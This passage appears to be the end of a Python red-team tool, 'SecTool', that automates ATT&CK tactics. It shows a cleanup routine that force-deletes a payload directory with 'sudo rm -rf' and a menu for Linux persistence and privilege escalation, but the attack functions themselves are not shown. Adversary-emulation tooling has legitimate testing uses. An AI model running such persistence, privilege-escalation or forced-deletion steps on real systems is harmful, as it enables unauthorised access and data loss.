        if not os.path.exists(payload_dir):
            print_info(f"Payload directory '{payload_dir}' not found. Nothing to clean.")
            return

        # Use sudo to remove the directory and its contents, bypassing permission issues
        stdout, stderr, returncode = run_command(["sudo", "rm", "-rf", payload_dir])
        if returncode == 0:
            print_success(f"Successfully removed payload directory: {payload_dir}")
        else:
            print_error(f"Failed to remove payload directory: {stderr}")

    except Exception as e:
        print_error(f"An error occurred during cleanup: {e}")

# --- Main Application Loop ---
def main_menu():
    """The main entry point and menu loop for the application."""
    parser = argparse.ArgumentParser(description="SecTool - ATT&CK Automation Framework")
    parser.add_argument("--config", type=str, default="sectool_config.json", help="Path to configuration file")
    args = parser.parse_args()
    global config
    config = load_config(args.config)

    # --- New Banner ---
    banner = r"""
  ____             _____            _
 / ___|  ___  ___ |_   _|__    ___ | |
 \___ \ / _ \/ __|  | | / _ \ / _ \| |
  ___) |  __/ |__   | |  (_) | (_) | |
 |____/ \___|\___|  |_| \___/ \___/|_|
    -- ATT&CK Automation Inspired v1.0 --
"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)
    input("Press Enter to start...")
    # --- End Banner ---


    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print_section_header("Main Menu - Choose a Tactic")
        print("1. Persistence (Linux)")
        print("2. Privilege Escalation (Linux)")
        print("3. Cleanup / Revert (Linux)")
        print("q. Quit")
        choice = input("Choose an option: ").lower()
        if choice == "1":
            linux_persistence_menu()
        elif choice == "2":
            linux_privesc_menu()
        elif choice == "3":
            cleanup_menu()
        elif choice == "q":
            print("Exiting tool.")
            break
        else:
            print_warning("Invalid choice.")
        if choice != 'q':
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    if sys.platform != "linux":
        print_error("This tool is designed for Linux systems only.")
        sys.exit(1)
    if os.geteuid() == 0:
        print_warning("Running as root. Some operations will not prompt for sudo.")
    
    main_menu()

